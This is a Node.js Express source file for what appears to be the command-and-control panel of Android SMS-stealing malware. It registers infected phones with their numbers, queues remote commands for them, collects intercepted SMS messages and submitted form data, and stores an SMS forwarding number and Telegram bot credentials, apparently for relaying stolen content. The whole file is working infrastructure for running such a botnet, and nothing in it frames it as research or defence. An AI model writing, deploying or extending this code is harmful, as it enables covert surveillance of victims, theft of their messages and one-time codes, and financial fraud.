const express = require('express');
const cors = require('cors');
const Database = require('better-sqlite3');
const path = require('path');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Database setup (Vercel uses /tmp for writable storage)
const dbPath = process.env.VERCEL ? '/tmp/c2h_panel.db' : './c2h_panel.db';
const db = new Database(dbPath);

// Initialize database
function initDB() {
    db.exec(`
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            device_name TEXT,
            os_version TEXT,
            phone_number TEXT,
            battery_level INTEGER,
            last_seen DATETIME NOT NULL,
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            command_type TEXT NOT NULL,
            command_data TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS sms_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            sender TEXT NOT NULL,
            message_body TEXT NOT NULL,
            received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT NOT NULL,
            custom_data TEXT NOT NULL,
            submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS global_settings (
            setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
            setting_value TEXT
        );
    `);
    console.log('✅ Database initialized');
}

initDB();

// FEATURE 1: Device Registration
app.post('/api/device/register', (req, res) => {
    try {
        const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
        
        if (!device_id) {
            return res.status(400).json({ status: 'error', message: 'device_id required' });
        }
        
        const last_seen = new Date().toISOString();
        const existing = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id);

        if (existing) {
            db.prepare(`UPDATE devices SET device_name = ?, os_version = ?, phone_number = ?, 
                battery_level = ?, last_seen = ? WHERE device_id = ?`)
                .run(device_name, os_version, phone_number, battery_level, last_seen, device_id);
            console.log('✅ Updated:', device_id);
        } else {
            db.prepare(`INSERT INTO devices (device_id, device_name, os_version, phone_number, 
                battery_level, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)`)
                .run(device_id, device_name, os_version, phone_number, battery_level, last_seen, last_seen);
            console.log('✅ New device:', device_id);
        }

        res.json({ status: 'success', message: 'Device data received and updated.' });
    } catch (error) {
        console.error('❌ Error:', error);
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 2: Get Devices
app.get('/api/devices', (req, res) => {
    try {
        const rows = db.prepare('SELECT * FROM devices ORDER BY created_at ASC').all();
        const currentTime = new Date();
        
        const devices = rows.map(device => {
            const lastSeen = new Date(device.last_seen);
            const timeDiff = (currentTime - lastSeen) / 1000;
            const is_online = timeDiff < 20;

            return {
                device_id: device.device_id,
                device_name: device.device_name,
                os_version: device.os_version,
                phone_number: device.phone_number,
                battery_level: device.battery_level,
                is_online: is_online,
                created_at: device.created_at
            };
        });

        res.json(devices);
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 3: Update SMS Forward
app.post('/api/config/sms_forward', (req, res) => {
    try {
        const { forward_number } = req.body;
        db.prepare(`INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
            VALUES ('sms_forward_number', ?)`).run(forward_number);
        res.json({ status: 'success', message: 'Forwarding number updated successfully.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 4: Get SMS Forward
app.get('/api/config/sms_forward', (req, res) => {
    try {
        const row = db.prepare('SELECT setting_value FROM global_settings WHERE setting_key = ?')
            .get('sms_forward_number');
        res.json({ forward_number: row ? row.setting_value : null });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 5: Telegram Config
app.post('/api/config/telegram', (req, res) => {
    try {
        const { telegram_bot_token, telegram_chat_id } = req.body;
        db.prepare(`INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
            VALUES ('telegram_bot_token', ?)`).run(telegram_bot_token);
        db.prepare(`INSERT OR REPLACE INTO global_settings (setting_key, setting_value) 
            VALUES ('telegram_chat_id', ?)`).run(telegram_chat_id);
        res.json({ status: 'success', message: 'Telegram details updated successfully.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/api/config/telegram', (req, res) => {
    try {
        const rows = db.prepare(`SELECT * FROM global_settings 
            WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')`).all();
        
        const result = {};
        rows.forEach(row => {
            result[row.setting_key] = row.setting_value;
        });
        
        res.json({
            telegram_bot_token: result.telegram_bot_token || null,
            telegram_chat_id: result.telegram_chat_id || null
        });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 6: Send Command
app.post('/api/command/send', (req, res) => {
    try {
        const { device_id, command_type, command_data } = req.body;
        db.prepare(`INSERT INTO commands (device_id, command_type, command_data, status) 
            VALUES (?, ?, ?, 'pending')`).run(device_id, command_type, JSON.stringify(command_data));
        res.json({ status: 'success', message: 'Command queued successfully.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Get Commands
app.get('/api/device/:deviceId/commands', (req, res) => {
    try {
        const { deviceId } = req.params;
        const rows = db.prepare(`SELECT * FROM commands WHERE device_id = ? AND status = 'pending'`)
            .all(deviceId);

        if (rows.length > 0) {
            const commandIds = rows.map(r => r.id);
            const placeholders = commandIds.map(() => '?').join(',');
            db.prepare(`UPDATE commands SET status = 'sent' WHERE id IN (${placeholders})`)
                .run(...commandIds);
        }

        const commands = rows.map(cmd => ({
            id: cmd.id,
            command_type: cmd.command_type,
            command_data: cmd.command_data
        }));

        res.json(commands);
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Execute Command
app.post('/api/command/:commandId/execute', (req, res) => {
    try {
        const { commandId } = req.params;
        db.prepare(`UPDATE commands SET status = 'executed' WHERE id = ?`).run(commandId);
        res.json({ status: 'success', message: 'Command marked as executed.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 7: Forms
app.post('/api/device/:deviceId/forms', (req, res) => {
    try {
        const { deviceId } = req.params;
        const { custom_data } = req.body;
        db.prepare('INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)')
            .run(deviceId, custom_data);
        res.json({ status: 'success', message: 'Form data saved.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/api/device/:deviceId/forms', (req, res) => {
    try {
        const { deviceId } = req.params;
        const rows = db.prepare('SELECT * FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC')
            .all(deviceId);
        res.json(rows);
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// FEATURE 8: SMS Logs
app.post('/api/device/:deviceId/sms', (req, res) => {
    try {
        const { deviceId } = req.params;
        const { sender, message_body } = req.body;
        db.prepare('INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)')
            .run(deviceId, sender, message_body);
        res.json({ status: 'success', message: 'SMS logged.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

app.get('/api/device/:deviceId/sms', (req, res) => {
    try {
        const { deviceId } = req.params;
        const rows = db.prepare('SELECT * FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC')
            .all(deviceId);
        res.json(rows);
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Delete Device
app.delete('/api/device/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        db.prepare('DELETE FROM devices WHERE device_id = ?').run(deviceId);
        db.prepare('DELETE FROM sms_logs WHERE device_id = ?').run(deviceId);
        db.prepare('DELETE FROM form_submissions WHERE device_id = ?').run(deviceId);
        res.json({ status: 'success', message: 'Device and related data deleted.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Delete SMS
app.delete('/api/sms/:smsId', (req, res) => {
    try {
        const { smsId } = req.params;
        db.prepare('DELETE FROM sms_logs WHERE id = ?').run(smsId);
        res.json({ status: 'success', message: 'SMS deleted.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: error.message });
    }
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// For Vercel serverless
module.exports = app;

// For local testing
if (require.main === module) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`🚀 Server running on port ${PORT}`);
    });
}
